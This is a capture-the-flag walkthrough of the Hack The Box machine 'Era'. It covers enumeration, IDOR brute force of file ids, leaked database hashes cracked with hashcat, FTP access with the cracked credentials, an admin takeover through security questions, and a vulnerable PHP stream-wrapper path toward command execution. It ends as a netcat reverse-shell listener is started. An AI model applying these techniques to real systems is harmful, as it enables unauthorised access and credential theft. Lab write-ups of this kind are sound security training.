---
title: Era [Medium]
date: 2025-07-31
tags: [htb, linux, nmap, ]
categories: [HTB Writeups]
author: 2Fa0n
img_path: /assets/img/era-htb-season8
image: /assets/img/era-htb-season8/era-htb-season8_banner.png
---

# Era HTB Season 8
## Machine information
Author: [yurivich](https://app.hackthebox.com/users/169229)

## Enumeration
### Nmap
```bash
└─$ sudo nmap -Pn -sC -sV 10.129.252.34
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-27 06:17 EDT
Nmap scan report for 10.129.252.34
Host is up (0.34s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://era.htb/
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 33.96 seconds
```

Add these to `/etc/hosts` file:
```bash
10.129.252.34     era.htb
```

So this machine go port `80` open, what make more interesting is that there is no port `22` or `2222` for ssh and only port `21` for ftp.

Let's check out the `http://era.htb`.

### Web Enumeration
![era](/assets/img/era-htb-season8/era-htb-season8_home_page.png)

Just a normal home page, nothing special to curious so let's try enumerate the subdomain.

```bash
└─$ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://era.htb/ -H "Host: FUZZ.era.htb" -mc 200

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://era.htb/
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.era.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200
________________________________________________

file                    [Status: 200, Size: 6765, Words: 2608, Lines: 234, Duration: 297ms]
:: Progress: [4989/4989] :: Job [1/1] :: 178 req/sec :: Duration: [0:00:26] :: Errors: 0 ::
```

Found `file` subdomain, add it to `/etc/hosts` file and check it out.

```bash
10.129.252.34     era.htb file.era.htb
```

![era](/assets/img/era-htb-season8/era-htb-season8_file_page.png)

So we can see that this one is about **manage files**, **upload files** and **update security questions**, there could be a chance for us to leverage the **upload files** feature to get a reverse shell. <br>
After a while on trying to find a way to register account as they do not show a button to sign up or some alert to register if I login with random account. <br>
&rarr; Let's enumerate some endpoints. Also there is other aspect to approach is that we can assume that if there is a login endpoint, there could be a register endpoint somehow. But to be more specific, we gonna use `fuzz` to fuzzing more endpoints to make it a clear aspect.

```bash
└─$ ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -u http://file.era.htb/FUZZ -e .php,.html,.txt,.js,.json,.xml,.bak,.old -fs 6765 -fc 404 -t 50

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://file.era.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
 :: Extensions       : .php .html .txt .js .json .xml .bak .old 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 50
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 404
 :: Filter           : Response size: 6765
________________________________________________

images                  [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 2300ms]
logout.php              [Status: 200, Size: 70, Words: 6, Lines: 1, Duration: 472ms]
register.php            [Status: 200, Size: 3205, Words: 1094, Lines: 106, Duration: 423ms]
login.php               [Status: 200, Size: 9214, Words: 3701, Lines: 327, Duration: 381ms]
download.php            [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 286ms]
files                   [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 242ms]
assets                  [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 145ms]
upload.php              [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 142ms]
manage.php              [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 81ms]
layout.php              [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 91ms]
reset.php               [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 1314ms]
:: Progress: [239247/239247] :: Job [1/1] :: 661 req/sec :: Duration: [0:15:54] :: Errors: 9 ::
```

Confirm there is a `register.php` endpoint and so on other endpoints. <br>
&rarr; Let's register a new account and start exploring the website.

![era](/assets/img/era-htb-season8/era-htb-season8_register_page.png)

```bash
username: test123
password: test123
```

![era](/assets/img/era-htb-season8/era-htb-season8_login_page.png)

So we are in the `manage.php` page which we can do lots of features. <br>
&rarr; The first thing I want to check out is the **Upload files** feature.

So I just upload a random file (for this part, I gonna upload `test.txt` file).

![era](/assets/img/era-htb-season8/era-htb-season8_upload_file.png)

We can see there is a url `http://file.era.htb/download.php?id=5540` which is for the download feature. <br>
&rarr; Let's check out this.

![era](/assets/img/era-htb-season8/era-htb-season8_download_file.png)

So we can download by clicking the icon and will get the file we just uploaded. <br>
Based on the id, I thinking that what if we can change the id so what will be happen?. So for this case, we can see that the id is `5540`. <br>
&rarr; Gonna bruteforce with `ffuf` from `0` to `10000` if we can get other file with different id.

```bash
└─$ ffuf -w <(seq 0 10000) -u 'http://file.era.htb/download.php?id=FUZZ' -H "Cookie: PHPSESSID=giur9t4tl1ukcf854io1bmq0m5" -mc 200 -fs 7686

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://file.era.htb/download.php?id=FUZZ
 :: Wordlist         : FUZZ: /proc/self/fd/11
 :: Header           : Cookie: PHPSESSID=giur9t4tl1ukcf854io1bmq0m5
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200
 :: Filter           : Response size: 7686
________________________________________________

54                      [Status: 200, Size: 6378, Words: 2552, Lines: 222, Duration: 526ms]
150                     [Status: 200, Size: 6366, Words: 2552, Lines: 222, Duration: 340ms]
5540                    [Status: 200, Size: 6364, Words: 2552, Lines: 222, Duration: 240ms]
:: Progress: [10001/10001] :: Job [1/1] :: 165 req/sec :: Duration: [0:00:56] :: Errors: 0 ::
```

> To get the `PHPSESSID` cookie, we just need to `F12` to turn on console and go to the `Storage` tab and grab the `PHPSESSID` value.

![era](/assets/img/era-htb-season8/era-htb-season8_php_session_id.png)

BOOM! We got `54` and `150` files. <br>
&rarr; Check them out.

![era](/assets/img/era-htb-season8/era-htb-season8_150_file.png)

We found a `signing.zip` file, unzip it out.

```bash
└─$ unzip signing.zip 
Archive:  signing.zip
  inflating: key.pem                 
  inflating: x509.genkey
```

Checking these file and found out this website use [ELF](https://en.wikipedia.org/wiki/Executable_and_Linkable_Format) for signing in `x509.genkey` file.

```bash
└─$ cat x509.genkey 
[ req ]
default_bits = 2048
distinguished_name = req_distinguished_name
prompt = no
string_mask = utf8only
x509_extensions = myexts

[ req_distinguished_name ]
O = Era Inc.
CN = ELF verification
emailAddress = yurivich@era.com

[ myexts ]
basicConstraints=critical,CA:FALSE
keyUsage=digitalSignature
subjectKeyIdentifier=hash
authorityKeyIdentifier=keyid
```

This is a **binary verification signature system** and it is standard file format for Linux/Unix executables, structured with headers, sections, program segments and extensible which we can add custom sections (if can, we can leverage this point later on for root privilege). This is could also be manipulated with tools like [objcopy](https://man7.org/linux/man-pages/man1/objcopy.1.html).

```bash
└─$ cat key.pem     
-----BEGIN PRIVATE KEY-----
MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQCqKH30+RZjkxiV
JMnuB6b1dDbWUaw3p2QyQvWMbFvsi7zG1kE2LBrKjsEyvcxo8m0wL9feuFiOlciD
MamELMAW0UjMyew01+S+bAEcOawH81bVahxNkA4hHi9d/rysTe/dnNkh08KgHhzF
mTApjbV0MQwUDOLXSw9eHd+1VJClwhwAsL4xdk4pQS6dAuJEnx3IzNoQ23f+dPqT
CMAAWST67VPZjSjwW1/HHNi12ePewEJRGB+2K+YeGj+lxShW/I1jYEHnsOrliM2h
ZvOLqS9LjhqfI9+Q1RxIQF69yAEUeN4lYupa0Ghr2h96YLRE5YyXaBxdSA4gLGOV
HZgMl2i/AgMBAAECggEALCO53NjamnT3bQTwjtsUT9rYOMtR8dPt1W3yNX2McPWk
wC2nF+7j+kSC0G9UvaqZcWUPyfonGsG3FHVHBH75S1H54QnGSMTyVQU+WnyJaDyS
+2R9uA8U4zlpzye7+LR08xdzaed9Nrzo+Mcuq7DTb7Mjb3YSSAf0EhWMyQSJSz38
nKOcQBQhwdmiZMnVQp7X4XE73+2Wft9NSeedzCpYRZHrI820O+4MeQrumfVijbL2
xx3o0pnvEnXiqbxJjYQS8gjSUAFCc5A0fHMGmVpvL+u7Sv40mj/rnGvDEAnaNf+j
SlC9KdF5z9gWAPii7JQtTzWzxDinUxNUhlJ00df29QKBgQDsAkzNjHAHNKVexJ4q
4CREawOfdB/Pe0lm3dNf5UlEbgNWVKExgN/dEhTLVYgpVXJiZJhKPGMhSnhZ/0oW
gSAvYcpPsuvZ/WN7lseTsH6jbRyVgd8mCF4JiCw3gusoBfCtp9spy8Vjs0mcWHRW
PRY8QbMG/SUCnUS0KuT1ikiIYwKBgQC4kkKlyVy2+Z3/zMPTCla/IV6/EiLidSdn
RHfDx8l67Dc03thgAaKFUYMVpwia3/UXQS9TPj9Ay+DDkkXsnx8m1pMxV0wtkrec
pVrSB9QvmdLYuuonmG8nlgHs4bfl/JO/+Y7lz/Um1qM7aoZyPFEeZTeh6qM2s+7K
kBnSvng29QKBgQCszhpSPswgWonjU+/D0Q59EiY68JoCH3FlYnLMumPlOPA0nA7S
4lwH0J9tKpliOnBgXuurH4At9gsdSnGC/NUGHII3zPgoSwI2kfZby1VOcCwHxGoR
vPqt3AkUNEXerkrFvCwa9Fr5X2M8mP/FzUCkqi5dpakduu19RhMTPkdRpQKBgQCJ
tU6WpUtQlaNF1IASuHcKeZpYUu7GKYSxrsrwvuJbnVx/TPkBgJbCg5ObFxn7e7dA
l3j40cudy7+yCzOynPJAJv6BZNHIetwVuuWtKPwuW8WNwL+ttTTRw0FCfRKZPL78
D/WHD4aoaKI3VX5kQw5+8CP24brOuKckaSlrLINC9QKBgDs90fIyrlg6YGB4r6Ey
4vXtVImpvnjfcNvAmgDwuY/zzLZv8Y5DJWTe8uxpiPcopa1oC6V7BzvIls+CC7VC
hc7aWcAJeTlk3hBHj7tpcfwNwk1zgcr1vuytFw64x2nq5odIS+80ThZTcGedTuj1
qKTzxN/SefLdu9+8MXlVZBWj
-----END PRIVATE KEY-----
-----BEGIN CERTIFICATE-----
MIIDajCCAlKgAwIBAgIUbWNKqYHhk6HkSMUgX/ebhOa29QswDQYJKoZIhvcNAQEL
BQAwTzERMA8GA1UECgwIRXJhIEluYy4xGTAXBgNVBAMMEEVMRiB2ZXJpZmljYXRp
b24xHzAdBgkqhkiG9w0BCQEWEHl1cml2aWNoQGVyYS5jb20wIBcNMjUwMTI2MDIw
OTM1WhgPMjEyNTAxMDIwMjA5MzVaME8xETAPBgNVBAoMCEVyYSBJbmMuMRkwFwYD
VQQDDBBFTEYgdmVyaWZpY2F0aW9uMR8wHQYJKoZIhvcNAQkBFhB5dXJpdmljaEBl
cmEuY29tMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAqih99PkWY5MY
lSTJ7gem9XQ21lGsN6dkMkL1jGxb7Iu8xtZBNiwayo7BMr3MaPJtMC/X3rhYjpXI
gzGphCzAFtFIzMnsNNfkvmwBHDmsB/NW1WocTZAOIR4vXf68rE3v3ZzZIdPCoB4c
xZkwKY21dDEMFAzi10sPXh3ftVSQpcIcALC+MXZOKUEunQLiRJ8dyMzaENt3/nT6
kwjAAFkk+u1T2Y0o8FtfxxzYtdnj3sBCURgftivmHho/pcUoVvyNY2BB57Dq5YjN
oWbzi6kvS44anyPfkNUcSEBevcgBFHjeJWLqWtBoa9ofemC0ROWMl2gcXUgOICxj
lR2YDJdovwIDAQABozwwOjAMBgNVHRMBAf8EAjAAMAsGA1UdDwQEAwIHgDAdBgNV
HQ4EFgQU/XYF/LzWBMr+NhZw/PHUlQHb0s0wDQYJKoZIhvcNAQELBQADggEBAAzE
eNQxIJH6Z8vOvP8g1OoyD0Ot9E8U/PdxlM7QWqk9qcH0xyQZqg7Ee5L/kq4y/1i1
ZxAPlBfOUx4KhZgWVkStfvut0Ilg3VSXVntPPRi8WAcDV5nivYtphv16ZQkaclFy
dN0mYQc2NlqDv+y5FKnGbkioRUVGGmkIqeaT4HIUA2CFRnTr2Jao0TwAIG0jfpov
+y/t2WhUNto9L04vcD3ZAzuEPZnqs/L9rsoDZ1Ee3DxnOC7l3PkklaIiDrXiHAkd
Nrg7N9XCeQr0FUS0xLMBMVCEJT2TCo6lXKtcI5A5FgAcyECDzkw+HdgSYFPaoYJq
5rxH+xhuDqRDr941Sg4=
-----END CERTIFICATE-----
```

And this `key.pem` contains a private key and certificate for the ELF verification. <br>
&rarr; Let's leave this part aside and continue the other id.

![era](/assets/img/era-htb-season8/era-htb-season8_54_file.png)

There is a `site-backup-30-08-24.zip` file, this could be great to get some more informations.

```bash
└─$ unzip site-backup-30-08-24.zip 
Archive:  site-backup-30-08-24.zip
  inflating: LICENSE                 
  inflating: bg.jpg                  
   creating: css/
  inflating: css/main.css.save       
  inflating: css/main.css            
  inflating: css/fontawesome-all.min.css  
  inflating: css/noscript.css        
   creating: css/images/
 extracting: css/images/overlay.png  
  inflating: download.php            
  inflating: filedb.sqlite           
   creating: files/
  inflating: files/.htaccess         
 extracting: files/index.php         
  inflating: functions.global.php    
  inflating: index.php               
  inflating: initial_layout.php      
  inflating: layout.php              
  inflating: layout_login.php        
  inflating: login.php               
  inflating: logout.php              
  inflating: main.png                
  inflating: manage.php              
  inflating: register.php            
  inflating: reset.php               
   creating: sass/
   creating: sass/layout/
  inflating: sass/layout/_wrapper.scss  
  inflating: sass/layout/_footer.scss  
  inflating: sass/layout/_main.scss  
  inflating: sass/main.scss          
   creating: sass/base/
  inflating: sass/base/_page.scss    
  inflating: sass/base/_reset.scss   
  inflating: sass/base/_typography.scss  
   creating: sass/libs/
  inflating: sass/libs/_vars.scss    
  inflating: sass/libs/_vendor.scss  
  inflating: sass/libs/_functions.scss  
  inflating: sass/libs/_mixins.scss  
  inflating: sass/libs/_breakpoints.scss  
  inflating: sass/noscript.scss      
   creating: sass/components/
  inflating: sass/components/_actions.scss  
  inflating: sass/components/_icons.scss  
  inflating: sass/components/_button.scss  
  inflating: sass/components/_icon.scss  
  inflating: sass/components/_list.scss  
  inflating: sass/components/_form.scss  
  inflating: screen-download.png     
  inflating: screen-login.png        
  inflating: screen-main.png         
  inflating: screen-manage.png       
  inflating: screen-upload.png       
  inflating: security_login.php      
  inflating: upload.php              
   creating: webfonts/
  inflating: webfonts/fa-solid-900.eot  
  inflating: webfonts/fa-regular-400.ttf  
  inflating: webfonts/fa-regular-400.woff  
  inflating: webfonts/fa-solid-900.svg  
  inflating: webfonts/fa-solid-900.ttf  
  inflating: webfonts/fa-solid-900.woff  
  inflating: webfonts/fa-brands-400.ttf  
 extracting: webfonts/fa-regular-400.woff2  
  inflating: webfonts/fa-solid-900.woff2  
  inflating: webfonts/fa-regular-400.eot  
  inflating: webfonts/fa-regular-400.svg  
  inflating: webfonts/fa-brands-400.woff2  
  inflating: webfonts/fa-brands-400.woff  
  inflating: webfonts/fa-brands-400.eot  
  inflating: webfonts/fa-brands-400.svg
```

Wow! That was a lot, but there is one potiential file that we can check out is `filedb.sqlite` file.

### Database Leak & Cracking
```bash
└─$ sqlite3 filedb.sqlite
SQLite version 3.46.1 2024-08-13 09:16:08
Enter ".help" for usage hints.
sqlite> .tables
files  users
sqlite> SELECT * FROM users;
1|admin_ef01cab31aa|$2y$10$wDbohsUaezf74d3sMNRPi.o93wDxJqphM2m0VVUp41If6WrYr.QPC|600|Maria|Oliver|Ottawa
2|eric|$2y$10$S9EOSDqF1RzNUvyVj7OtJ.mskgP1spN3g2dneU.D.ABQLhSV2Qvxm|-1|||
3|veronica|$2y$10$xQmS7JL8UT4B3jAYK7jsNeZ4I.YqaFFnZNA/2GCxLveQ805kuQGOK|-1|||
4|yuri|$2b$12$HkRKUdjjOdf2WuTXovkHIOXwVDfSrgCqqHPpE37uWejRqUWqwEL2.|-1|||
5|john|$2a$10$iccCEz6.5.W2p7CSBOr3ReaOqyNmINMH1LaqeQaL22a1T1V/IddE6|-1|||
6|ethan|$2a$10$PkV/LAd07ftxVzBHhrpgcOwD3G1omX4Dk2Y56Tv9DpuUV/dh/a1wC|-1|||
```

Got two tables `files` and `users`. And found out some user and password hash. <br>
&rarr; Let's crack them.

```bash
└─$ sqlite3 filedb.sqlite "SELECT user_name || ':' || user_password FROM users;" > hashes.txt 

└─$ cat hashes.txt 
admin_ef01cab31aa:$2y$10$wDbohsUaezf74d3sMNRPi.o93wDxJqphM2m0VVUp41If6WrYr.QPC
eric:$2y$10$S9EOSDqF1RzNUvyVj7OtJ.mskgP1spN3g2dneU.D.ABQLhSV2Qvxm
veronica:$2y$10$xQmS7JL8UT4B3jAYK7jsNeZ4I.YqaFFnZNA/2GCxLveQ805kuQGOK
yuri:$2b$12$HkRKUdjjOdf2WuTXovkHIOXwVDfSrgCqqHPpE37uWejRqUWqwEL2.
john:$2a$10$iccCEz6.5.W2p7CSBOr3ReaOqyNmINMH1LaqeQaL22a1T1V/IddE6
ethan:$2a$10$PkV/LAd07ftxVzBHhrpgcOwD3G1omX4Dk2Y56Tv9DpuUV/dh/a1wC
```

Gonna put them in one file and crack them at once faster than enter manually each one. But need to identify the hash type first.

```bash
└─$ hashid hashes.txt
--File 'hashes.txt'--
Analyzing '$2y$10$wDbohsUaezf74d3sMNRPi.o93wDxJqphM2m0VVUp41If6WrYr.QPC'
[+] Blowfish(OpenBSD) 
[+] Woltlab Burning Board 4.x 
[+] bcrypt 
Analyzing '$2y$10$S9EOSDqF1RzNUvyVj7OtJ.mskgP1spN3g2dneU.D.ABQLhSV2Qvxm'
[+] Blowfish(OpenBSD) 
[+] Woltlab Burning Board 4.x 
[+] bcrypt 
Analyzing '$2y$10$xQmS7JL8UT4B3jAYK7jsNeZ4I.YqaFFnZNA/2GCxLveQ805kuQGOK'
[+] Blowfish(OpenBSD) 
[+] Woltlab Burning Board 4.x 
[+] bcrypt 
Analyzing '$2b$12$HkRKUdjjOdf2WuTXovkHIOXwVDfSrgCqqHPpE37uWejRqUWqwEL2.'
[+] Unknown hash
Analyzing '$2a$10$iccCEz6.5.W2p7CSBOr3ReaOqyNmINMH1LaqeQaL22a1T1V/IddE6'
[+] Blowfish(OpenBSD) 
[+] Woltlab Burning Board 4.x 
[+] bcrypt 
Analyzing '$2a$10$PkV/LAd07ftxVzBHhrpgcOwD3G1omX4Dk2Y56Tv9DpuUV/dh/a1wC'
[+] Blowfish(OpenBSD) 
[+] Woltlab Burning Board 4.x 
[+] bcrypt 
--End of file 'hashes.txt'--
```

So there is using `bcrypt` hash, let's crack it out.

```bash
└─$ hashcat -h | grep -i bcrypt
   3200 | bcrypt $2*$, Blowfish (Unix)                               | Operating System
  25600 | bcrypt(md5($pass)) / bcryptmd5                             | Forums, CMS, E-Commerce
  25800 | bcrypt(sha1($pass)) / bcryptsha1                           | Forums, CMS, E-Commerce
  28400 | bcrypt(sha512($pass)) / bcryptsha512                       | Forums, CMS, E-Commerce
```

```bash
└─$ hashcat -m 3200 hashes.txt /usr/share/wordlists/rockyou.txt -w 3 -O --username

└─$ hashcat -m 3200 hashes.txt --show --username
eric:$2y$10$S9EOSDqF1RzNUvyVj7OtJ.mskgP1spN3g2dneU.D.ABQLhSV2Qvxm:america
yuri:$2b$12$HkRKUdjjOdf2WuTXovkHIOXwVDfSrgCqqHPpE37uWejRqUWqwEL2.:mustang
```

Got `eric:america` and `yuri:mustang`. Normal there will be a port `22` and we can ssh and easily grab the `user.txt` flag. <br>
But this machine just have a port `21` for ftp so we gonna connect and use these two credentials.

### FTP
```bash
└─$ ftp 10.129.252.34
Connected to 10.129.252.34.
220 (vsFTPd 3.0.5)
Name (10.129.252.34:kali): yuri
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
229 Entering Extended Passive Mode (|||14069|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 Jul 22 08:42 apache2_conf
drwxr-xr-x    3 0        0            4096 Jul 22 08:42 php8.1_conf
226 Directory send OK.
```

After trying, just only `yuri:mustang` can login to ftp. Maybe `eric` is for other part that could be internal and escalate to root. <br>
Recon and found out there is two folder `apache2_conf` and `php8.1_conf`.

```bash
ftp> cd apache2_conf
250 Directory successfully changed.
ftp> dir
229 Entering Extended Passive Mode (|||64195|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0            1332 Dec 08  2024 000-default.conf
-rw-r--r--    1 0        0            7224 Dec 08  2024 apache2.conf
-rw-r--r--    1 0        0             222 Dec 13  2024 file.conf
-rw-r--r--    1 0        0             320 Dec 08  2024 ports.conf
226 Directory send OK.
```

```bash
ftp> cd php8.1_conf
250 Directory successfully changed.
ftp> dir
229 Entering Extended Passive Mode (|||54698|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 Jul 22 08:42 build
-rw-r--r--    1 0        0           35080 Dec 08  2024 calendar.so
-rw-r--r--    1 0        0           14600 Dec 08  2024 ctype.so
-rw-r--r--    1 0        0          190728 Dec 08  2024 dom.so
-rw-r--r--    1 0        0           96520 Dec 08  2024 exif.so
-rw-r--r--    1 0        0          174344 Dec 08  2024 ffi.so
-rw-r--r--    1 0        0         7153984 Dec 08  2024 fileinfo.so
-rw-r--r--    1 0        0           67848 Dec 08  2024 ftp.so
-rw-r--r--    1 0        0           18696 Dec 08  2024 gettext.so
-rw-r--r--    1 0        0           51464 Dec 08  2024 iconv.so
-rw-r--r--    1 0        0         1006632 Dec 08  2024 opcache.so
-rw-r--r--    1 0        0          121096 Dec 08  2024 pdo.so
-rw-r--r--    1 0        0           39176 Dec 08  2024 pdo_sqlite.so
-rw-r--r--    1 0        0          284936 Dec 08  2024 phar.so
-rw-r--r--    1 0        0           43272 Dec 08  2024 posix.so
-rw-r--r--    1 0        0           39176 Dec 08  2024 readline.so
-rw-r--r--    1 0        0           18696 Dec 08  2024 shmop.so
-rw-r--r--    1 0        0           59656 Dec 08  2024 simplexml.so
-rw-r--r--    1 0        0          104712 Dec 08  2024 sockets.so
-rw-r--r--    1 0        0           67848 Dec 08  2024 sqlite3.so
-rw-r--r--    1 0        0          313912 Dec 08  2024 ssh2.so
-rw-r--r--    1 0        0           22792 Dec 08  2024 sysvmsg.so
-rw-r--r--    1 0        0           14600 Dec 08  2024 sysvsem.so
-rw-r--r--    1 0        0           22792 Dec 08  2024 sysvshm.so
-rw-r--r--    1 0        0           35080 Dec 08  2024 tokenizer.so
-rw-r--r--    1 0        0           59656 Dec 08  2024 xml.so
-rw-r--r--    1 0        0           43272 Dec 08  2024 xmlreader.so
-rw-r--r--    1 0        0           51464 Dec 08  2024 xmlwriter.so
-rw-r--r--    1 0        0           39176 Dec 08  2024 xsl.so
-rw-r--r--    1 0        0           84232 Dec 08  2024 zip.so
226 Directory send OK.
```

So we gonna download these all to our kali machine for easier analysis. <br>
We can try this way.

```bash
ftp> prompt off
ftp> binary

ftp> !mkdir apache2_conf          # Create local directory
ftp> cd apache2_conf              # Go to remote directory
ftp> lcd apache2_conf             # Go to local directory
ftp> mget *                       # Download all files
ftp> cd ..                        # Back to remote parent
ftp> lcd ..                       # Back to local parent
```

> Same for `php8.1_conf` folder.

Or we can use `mget` to download all files at once.

```bash
└─$ wget -r --ftp-user=yuri --ftp-password=mustang ftp://10.129.252.34/ -P era_ftp_files/
```

```bash
└─$ tree .
.
└── 10.129.252.34
    ├── apache2_conf
    │   ├── 000-default.conf
    │   ├── apache2.conf
    │   ├── file.conf
    │   └── ports.conf
    └── php8.1_conf
        ├── build
        │   ├── ax_check_compile_flag.m4
        │   ├── ax_gcc_func_attribute.m4
        │   ├── gen_stub.php
        │   ├── Makefile.global
        │   ├── php_cxx_compile_stdcxx.m4
        │   ├── phpize.m4
        │   ├── php.m4
        │   └── run-tests.php
        ├── calendar.so
        ├── ctype.so
        ├── dom.so
        ├── exif.so
        ├── ffi.so
        ├── fileinfo.so
        ├── ftp.so
        ├── gettext.so
        ├── iconv.so
        ├── opcache.so
        ├── pdo.so
        ├── pdo_sqlite.so
        ├── phar.so
        ├── posix.so
        ├── readline.so
        ├── shmop.so
        ├── simplexml.so
        ├── sockets.so
        ├── sqlite3.so
        ├── ssh2.so
        ├── sysvmsg.so
        ├── sysvsem.so
        ├── sysvshm.so
        ├── tokenizer.so
        ├── xmlreader.so
        ├── xml.so
        ├── xmlwriter.so
        ├── xsl.so
        └── zip.so

5 directories, 41 files
```

### SSRF via IDOR and Stream Wrapper
Going through all the code, we know that there must be a way to reverse shell so we saw that there is a `ssh2.so` file. Searching and found out [Stream Wrapper](https://www.php.net/manual/en/wrappers.ssh2.php) in PHP. <br>
We gonna use `ssh2.exec://user:pass@example.com:22/usr/local/bin/somecmd` to execute command. But to know how to combine and make it work, we got this file `download.php`.

```php
// download.php 
<?php

require_once('functions.global.php');
require_once('layout.php');

function deliverMiddle_download($title, $subtitle, $content) {
    return '
    <main style="
        display: flex; 
        flex-direction: column; 
        align-items: center; 
        justify-content: center; 
        height: 80vh; 
        text-align: center;
        padding: 2rem;
    ">
        <h1>' . htmlspecialchars($title) . '</h1>
        <p>' . htmlspecialchars($subtitle) . '</p>
        <div>' . $content . '</div>
    </main>
    ';
}


if (!isset($_GET['id'])) {
  header('location: index.php'); // user loaded without requesting file by id
  die();
}

if (!is_numeric($_GET['id'])) {
  header('location: index.php'); // user requested non-numeric (invalid) file id
  die();
}

$reqFile = $_GET['id'];

$fetched = contactDB("SELECT * FROM files WHERE fileid='$reqFile';", 1);

$realFile = (count($fetched) != 0); // Set realFile to true if we found the file id, false if we didn't find it

if (!$realFile) {
  echo deliverTop("Era - Download");

  echo deliverMiddle("File Not Found", "The file you requested doesn't exist on this server", "");

  echo deliverBottom();
} else {
  $fileName = str_replace("files/", "", $fetched[0]);


  // Allow immediate file download
  if ($_GET['dl'] === "true") {

        header('Content-Type: application/octet-stream');
        header("Content-Transfer-Encoding: Binary");
        header("Content-disposition: attachment; filename=\"" .$fileName. "\"");
        readfile($fetched[0]);
  // BETA (Currently only available to the admin) - Showcase file instead of downloading it
  } elseif ($_GET['show'] === "true" && $_SESSION['erauser'] === 1) {
                $format = isset($_GET['format']) ? $_GET['format'] : '';
                $file = $fetched[0];

        if (strpos($format, '://') !== false) {
                        $wrapper = $format;
                        header('Content-Type: application/octet-stream');
                } else {
                        $wrapper = '';
                        header('Content-Type: text/html');
                }

                try {
                        $file_content = fopen($wrapper ? $wrapper . $file : $file, 'r');
                $full_path = $wrapper ? $wrapper . $file : $file;
                // Debug Output
                echo "Opening: " . $full_path . "\n";
                        echo $file_content;
                } catch (Exception $e) {
                        echo "Error reading file: " . $e->getMessage();
                }


  // Allow simple download
  } else {
        echo deliverTop("Era - Download");
        echo deliverMiddle_download("Your Download Is Ready!", $fileName, '<a href="download.php?id='.$_GET['id'].'&dl=true"><i class="fa fa-download fa-5x"></i></a>');

  }

}


?>
```

We can see that there is a part for only admin access to show the file instead of downloading it. <br>
So if we can login as admin, we can leverage to use this part to perform the attack. We need to include `show` parameter set to `true` and also our session need to be admin. <br>
After that we can add another parameter `format` which user will input from URL parameter and the `file` will be take from the database.

The point is that there is no validation for the `format` parameter and together with the stream wrapper above that if there is `://` in the format string &rarr; It will be treat as a stream wrapper. <br>
And so on it will go through [fopen](https://www.php.net/manual/en/function.fopen.php) function and execute the command. <br>
&rarr; We can abuse this part to got ourself into the internal network and got our reverse shell.

Since we got `eric` has not been used yet, we gonna use this to perform the attack. <br>
But we need to login as admin first.

![era](/assets/img/era-htb-season8/era-htb-season8_reset_page.png)

We gonna update the security questions and fill it with `admin_ef01cab31aa`. Then we signout our current session and login back, but for this time, we gonna `login using security questions`.

![era](/assets/img/era-htb-season8/era-htb-season8_security_questions_page.png)

![era](/assets/img/era-htb-season8/era-htb-season8_security_questions_page_2.png)

Fill in the `admin_ef01cab31aa` for username and security questions and click on `Verify and Log In` button.

![era](/assets/img/era-htb-season8/era-htb-season8_admin_page.png)

We got into admin as we can see there are two files that we get from `fuzz`. <br>
&rarr; Let's perform the attack.

First, we need to upload a random file to `upload.php` page and note down the `id` of the file.

```bash
http://file.era.htb/download.php?id=8052
```

Then setup our kali listener.

```bash
└─$ nc -lvnp 3333      
listening on [any] 3333 ...
```

